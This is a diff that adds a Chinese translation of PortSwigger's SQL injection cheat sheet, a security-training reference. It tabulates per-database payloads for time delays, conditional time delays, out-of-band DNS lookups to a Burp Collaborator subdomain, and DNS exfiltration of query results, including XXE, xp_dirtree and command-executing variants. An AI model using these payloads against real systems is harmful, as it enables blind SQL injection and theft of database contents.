@@ -89,27 +89,47 @@ description: '原文链接：https://portswigger.net/web-security/sql-injection/
 
 ### 时间延迟
 
+您可以在数据库处理查询时造成时间延迟。以下将造成10秒的无条件时间延迟。
 
-
-
+| DataBases | Statements |
+| :--- | :--- |
+| Oracle | `dbms_pipe.receive_message(('a'),10)` |
+| Microsoft | `WAITFOR DELAY '0:0:10'` |
+| PostgreSQL | `SELECT pg_sleep(10)` |
+| MySQL | `SELECT sleep(10)` |
 
 ### 有条件的时间延迟
 
+你可以测试一个布尔条件，如果条件为真，就会触发一个时间延迟。
 
-
-
+| DataBases | Statements |
+| :--- | :--- |
+| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
+| Microsoft | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
+| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
+| MySQL | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')` |
 
 ### DNS查找
 
+您可以使数据库执行对外部域的 DNS 查找。要做到这一点，您需要使用 [Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成一个您将在攻击中使用的唯一 Burp Collaborator 子域，然后轮询 Collaborator 服务器以确认发生了 DNS 查找。
 
-
-
+| DataBases | Statements |
+| :--- | :--- |
+| Oracle | The following technique leverages an XML external entity \([XXE](https://portswigger.net/web-security/xxe)\) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence: `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual`  The following technique works on fully patched Oracle installations, but requires elevated privileges: `SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')` |
+| Microsoft | `exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'` |
+| PostgreSQL | copy \(SELECT ''\) to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net' |
+| MySQL | The following techniques work on Windows only: `LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')` `SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'` |
 
 ### 带数据渗出的DNS查找
 
+您可以使数据库对包含注入查询结果的外部域进行 DNS 查询。要做到这一点，您需要使用 [Burp Collaborator 客户端](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client)生成一个您将在攻击中使用的唯一 Burp Collaborator 子域，然后轮询 Collaborator 服务器以检索任何 DNS 交互的细节，包括被渗出的数据。
 
-
-
+| DataBases | Statements |
+| :--- | :--- |
+| Oracle | SELECT extractvalue\(xmltype\('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root \[ &lt;!ENTITY % remote SYSTEM "http://'\|\|\(SELECT YOUR-QUERY-HERE\)\|\|'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"&gt; %remote;\]&gt;'\),'/l'\) FROM dual |
+| Microsoft | declare @p varchar\(1024\);set @p=\(SELECT YOUR-QUERY-HERE\);exec\('master..xp\_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"'\) |
+| PostgreSQL |  |
+| MySQL | The following technique works on Windows only: `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'` |
 
 
 
